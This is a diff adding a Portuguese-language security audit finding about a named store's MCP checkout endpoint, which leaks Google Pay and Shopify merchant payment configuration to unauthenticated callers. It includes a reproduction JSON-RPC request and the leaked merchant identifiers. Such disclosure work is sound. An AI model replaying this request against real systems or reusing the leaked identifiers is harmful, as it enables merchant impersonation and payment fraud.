@@ -1,0 +1,76 @@
+# F-003 — Vazamento de configuração de payment handlers (Google Pay merchant_id, gatewayMerchantId, bandeiras)
+
+- **Alvo:** https://impconcursos.com.br/api/ucp/mcp  (tool: get_checkout / get_cart / update_checkout / etc.)
+- **Severidade:** ALTA
+- **Timestamp:** 2026-08-27T05:02Z
+- **Classificação OWASP:** A01:2021 Broken Access Control / A02:2021 Cryptographic Failures (exposição de identificadores de pagamento) / A05:2021 Security Misconfiguration
+
+## Resumo
+Toda resposta do MCP para tools de checkout/carrinho (mesmo as de erro, e.g. `invalid_checkout_id`) inclui, em `structuredContent.ucp.payment_handlers`, a **configuração completa dos payment handlers do merchant**, retornada a qualquer chamador que apresente um profile UCP auto-hospedado válido (sem JWT de buyer). Isso expõe identificadores de merchant de pagamento que habilitam personificação/fraude direcionada.
+
+## Reprodução
+```
+POST /api/ucp/mcp
+{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"get_checkout","arguments":{"meta":{"ucp-agent":{"profile":"https://thesis-vary-nail-institute.trycloudflare.com"}},"id":"gid://shopify/Checkout/Z2NwLXVjcC1ub25leGlzdGVudC10ZXN0LTEyMzQ1Njc4OTA"}}}
+```
+Resposta `200 OK` (arquivo `enum/shopify/evid_getcheckout_body.json`), trecho vazado:
+```json
+"payment_handlers": {
+  "com.google.pay": [{
+    "id": "gpay",
+    "version": "2026-01-11",
+    "config": {
+      "merchant_info": {
+        "merchant_name": "IMP Concursos",
+        "merchant_id": "16708973830884969730",
+        "merchant_origin": "impconcursos.com.br",
+        "auth_jwt": ""
+      },
+      "allowed_payment_methods": [{
+        "type": "CARD",
+        "parameters": {
+          "allowed_auth_methods": ["PAN_ONLY","CRYPTOGRAM_3DS"],
+          "allowed_card_networks": ["VISA","MASTERCARD","AMEX","DISCOVER"],
+          "billing_address_required": true,
+          "billing_address_parameters": {"format":"FULL","phone_number_required": true}
+        },
+        "tokenization_specification": {
+          "type": "PAYMENT_GATEWAY",
+          "parameters": {"gateway": "shopify", "gatewayMerchantId": "82886885664"}
+        }
+      }]
+    }
+  }],
+  "dev.shopify.card": [{
+    "id": "shopify.card",
+    "version": "2026-01-15",
+    "config": {
+      "payment_methods": [{"type":"card","enabled_card_brands":["visa","master","american_express","discover","diners_club"]}]
+    }
+  }]
+}
+```
+O mesmo conteúdo é retornado por `get_cart`, `update_checkout`, `update_cart`, `cancel_checkout`, `cancel_cart` (todas testadas com GID falso — nenhuma mutação ocorreu). `get_order` (JWT-gated) NÃO retorna este conteúdo (erro de auth antes da negociação).
+
+## Dados sensíveis vazados
+- **Google Pay merchant_id:** `16708973830884969730` (identificador único do merchant no Google Pay — alvo de fraudes de personificação/chargeback).
+- **gateway / gatewayMerchantId:** `shopify` / `82886885664` (= Shop ID — correlaciona merchant à conta Shopify).
+- **merchant_origin:** `impconcursos.com.br`; **merchant_name:** `IMP Concursos`.
+- Bandeiras e métodos de autenticação aceitos (VISA/MASTERCARD/AMEX/DISCOVER; PAN_ONLY/CRYPTOGRAM_3DS; Visa/Master/Amex/Discover/Diners via Shopify Card).
+- `auth_jwt: ""` (vazio neste contexto) — campo de credencial de merchant Google Pay.
+
+## Interpretação
+Os `payment_handlers` deveriam ser entregues apenas após negociação autenticada/autorizada com uma plataforma confiável. Aqui são vazados a qualquer auto-registro (F-002). Os merchant IDs do Google Pay são considerados semi-secretos: sua exposição facilita ataques de personificação de merchant, fraudes de tokenização direcionada e engenharia social contra o PSP/Google.
+
+## Impacto
+- Disclosure de identificadores de pagamento do merchant a qualquer atacante (não autenticado como buyer).
+- Base para fraude direcionada / personificação de merchant Google Pay.
+- Informação de reconhecimento para ataques posteriores sobre o fluxo de pagamento.
+
+## Recomendação
+- Não incluir `payment_handlers` em respostas a chamadores não autenticados/não confiáveis.
+- Exigir autenticação de plataforma (cadastro + assinatura do profile) antes de entregar config de payment handlers.
+- Tratar `merchant_id` do Google Pay e `gatewayMerchantId` como segredos de configuração, não expostos em endpoints públicos.
+
+## Próximo passo
+Validado. Documentar para o relatório. Sem mutação — read-only confirmado.
